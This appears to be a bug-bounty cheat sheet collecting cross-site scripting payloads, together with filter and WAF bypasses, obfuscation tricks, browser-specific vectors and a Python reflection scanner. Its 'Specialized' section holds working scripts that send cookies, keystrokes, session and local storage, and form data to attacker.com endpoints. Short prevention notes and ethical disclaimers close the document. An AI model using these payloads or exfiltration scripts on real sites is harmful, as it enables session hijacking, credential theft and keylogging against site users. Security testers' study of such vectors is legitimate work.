# ⚡ XSS (Cross-Site Scripting) Payloads Collection

> **Comprehensive XSS payloads for ethical security testing**

## ⚠️ **ETHICAL USE ONLY**
These payloads are for authorized testing only. Use responsibly and legally.

## 🎯 Basic XSS Payloads

### Simple Alert Payloads
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

### Event Handler Payloads
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
```

### JavaScript Protocol Payloads
```html
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')"></iframe>
<form action="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
```

## 🔥 Advanced XSS Payloads

### DOM-Based XSS
```javascript
// URL fragment exploitation
http://target.com/page.html#<script>alert('XSS')</script>

// Document.write exploitation
<script>document.write('<img src=x onerror=alert(1)>')</script>

// innerHTML exploitation
<img src=x onerror="this.parentNode.innerHTML='<script>alert(1)</script>'">

// Location manipulation
<script>location='javascript:alert(1)'</script>
```

### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Encoding bypass -->
<script>alert('XSS')</script>
<script>alert(&#39;XSS&#39;)</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Comment insertion -->
<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
<scr/*comment*/ipt>alert('XSS')</scr/*comment*/ipt>

<!-- Null byte insertion -->
<script>alert('XSS')</script>
<scri%00pt>alert('XSS')</scri%00pt>

<!-- Unicode bypass -->
<script>alert('XSS')</script>
<script>alert('\u0058\u0053\u0053')</script>
```

### Attribute-Based XSS
```html
<!-- Input field XSS -->
<input value=""><script>alert('XSS')</script>">
<input value='' onmouseover='alert("XSS")'>

<!-- Image attribute XSS -->
<img src="x" alt=""><script>alert('XSS')</script>">
<img src="javascript:alert('XSS')">

<!-- Link attribute XSS -->
<a href="javascript:alert('XSS')">Click</a>
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>

<!-- Style attribute XSS -->
<div style="background:url('javascript:alert(1)')">
<div style="expression(alert('XSS'))">
```

## 🛠️ Context-Specific Payloads

### HTML Context
```html
<!-- Basic HTML injection -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- HTML5 specific -->
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
<video><source onerror="alert('XSS')">
```

### JavaScript Context
```javascript
// String context
'; alert('XSS'); //
'; alert('XSS'); var dummy='

// Variable assignment
var x = 'USER_INPUT'; // Payload: '; alert('XSS'); //

// Function parameter
function test(param) { // Payload: '); alert('XSS'); //
```

### CSS Context
```css
/* CSS injection */
</style><script>alert('XSS')</script>
body { background: url('javascript:alert(1)'); }
@import 'javascript:alert("XSS")';

/* CSS expression (IE) */
body { background: expression(alert('XSS')); }
div { width: expression(alert('XSS')); }
```

### URL Context
```html
<!-- URL parameter injection -->
<a href="http://target.com?param=javascript:alert('XSS')">
<iframe src="http://target.com?param=<script>alert('XSS')</script>">

<!-- Data URI -->
<iframe src="data:text/html,<script>alert('XSS')</script>">
<object data="data:text/html,<script>alert('XSS')</script>">
```

## 🎯 Payload Variations by Browser

### Chrome/Webkit Payloads
```html
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

### Firefox Payloads
```html
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
```

### Internet Explorer Payloads
```html
<img src=x onerror=alert('XSS')>
<div style="expression(alert('XSS'))">
<xml onreadystatechange=alert('XSS')>
<bgsound src=javascript:alert('XSS')>
```

### Safari Payloads
```html
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<video><source onerror="alert('XSS')">
<keygen onfocus=alert('XSS') autofocus>
```

## 🔍 WAF Bypass Techniques

### Encoding Bypass
```html
<!-- HTML entity encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#60;script&#62;alert('XSS')&#60;/script&#62;

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E

<!-- Unicode encoding -->
\u003cscript\u003ealert('XSS')\u003c/script\u003e
\x3cscript\x3ealert('XSS')\x3c/script\x3e

<!-- Base64 encoding -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

### Obfuscation Techniques
```javascript
// String concatenation
<script>alert('X'+'S'+'S')</script>
<script>alert(String.fromCharCode(88,83,83))</script>

// Eval obfuscation
<script>eval('alert("XSS")')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

// Function constructor
<script>(function(){alert('XSS')})()</script>
<script>new Function('alert("XSS")')();</script>

// Template literals
<script>alert`XSS`</script>
<script>eval`alert\`XSS\``</script>
```

### Alternative Event Handlers
```html
<!-- Less common events -->
<details ontoggle=alert('XSS') open>
<marquee onstart=alert('XSS')>
<isindex onmouseover="alert('XSS')" >
<listing onmouseover="alert('XSS')" >
<xmp onmouseover="alert('XSS')" >
<plaintext onmouseover="alert('XSS')" >
```

## 🎯 Specialized XSS Payloads

### Cookie Stealing
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<script>
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: 'cookie=' + document.cookie
});
</script>
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keylog.php', {
        method: 'POST',
        body: 'key=' + String.fromCharCode(e.which)
    });
}
</script>
```

### Session Hijacking
```javascript
<script>
// Steal session storage
var session = JSON.stringify(sessionStorage);
fetch('http://attacker.com/session.php', {
    method: 'POST',
    body: 'session=' + session
});

// Steal local storage
var local = JSON.stringify(localStorage);
fetch('http://attacker.com/local.php', {
    method: 'POST',
    body: 'local=' + local
});
</script>
```

### Form Hijacking
```javascript
<script>
// Intercept form submissions
document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    fetch('http://attacker.com/form.php', {
        method: 'POST',
        body: formData
    });
});
</script>
```

## 🔧 XSS Testing Tools

### Manual Testing Payloads
```html
<!-- Quick test payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Automated Testing
```python
#!/usr/bin/env python3
"""
XSS Testing Automation Script
Author: LakshmiKanthanK(letchupkt)
"""

import requests
from urllib.parse import quote

def test_xss_payloads(url, parameter):
    """Test XSS payloads against a parameter"""
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')></iframe>"
    ]
    
    vulnerabilities = []
    
    for payload in payloads:
        # URL encode the payload
        encoded_payload = quote(payload)
        
        # Construct test URL
        test_url = f"{url}?{parameter}={encoded_payload}"
        
        try:
            response = requests.get(test_url, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text or payload.lower() in response.text.lower():
                vulnerabilities.append({
                    'payload': payload,
                    'url': test_url,
                    'reflected': True
                })
                print(f"[+] Potential XSS found: {payload}")
            
        except requests.RequestException as e:
            print(f"[-] Request failed: {e}")
    
    return vulnerabilities

# Usage example
vulnerabilities = test_xss_payloads("http://target.com/search", "q")
```

### Browser-Based Testing
```javascript
// XSS testing in browser console
function testXSS(payload) {
    var testDiv = document.createElement('div');
    testDiv.innerHTML = payload;
    document.body.appendChild(testDiv);
    
    // Check if script executed
    setTimeout(function() {
        document.body.removeChild(testDiv);
    }, 1000);
}

// Test payloads
var payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
];

payloads.forEach(testXSS);
```

## 📚 XSS Prevention and Mitigation

### Input Validation
```javascript
// Whitelist approach
function validateInput(input) {
    var allowedChars = /^[a-zA-Z0-9\s]+$/;
    return allowedChars.test(input);
}

// Blacklist approach (less secure)
function sanitizeInput(input) {
    return input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
}
```

### Output Encoding
```javascript
// HTML encoding
function htmlEncode(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;');
}

// JavaScript encoding
function jsEncode(str) {
    return str.replace(/\\/g, '\\\\')
              .replace(/'/g, "\\'")
              .replace(/"/g, '\\"')
              .replace(/\n/g, '\\n')
              .replace(/\r/g, '\\r');
}
```

### Content Security Policy (CSP)
```html
<!-- Strict CSP header -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;">

<!-- Report-only CSP for testing -->
<meta http-equiv="Content-Security-Policy-Report-Only" content="default-src 'self'; report-uri /csp-report">
```

---

## 📚 Learning Resources

### 🎓 Practice Platforms
- **XSS Game**: Google's XSS challenge
- **DVWA**: XSS practice scenarios
- **WebGoat**: OWASP XSS lessons
- **PortSwigger Academy**: XSS labs

### 📖 Reference Materials
- **OWASP XSS Prevention Cheat Sheet**
- **XSS Filter Evasion Cheat Sheet**
- **Browser-specific XSS vectors**
- **CSP documentation and examples**

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Authorized Testing Only
- Obtain explicit written permission
- Stay within defined scope
- Avoid accessing sensitive data
- Report findings responsibly

### 🚫 Prohibited Activities
- Testing without authorization
- Stealing user data or sessions
- Defacing websites
- Distributing malicious payloads
- Using XSS for malicious purposes

---

**Created by: LakshmiKanthanK(letchupkt)**
*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*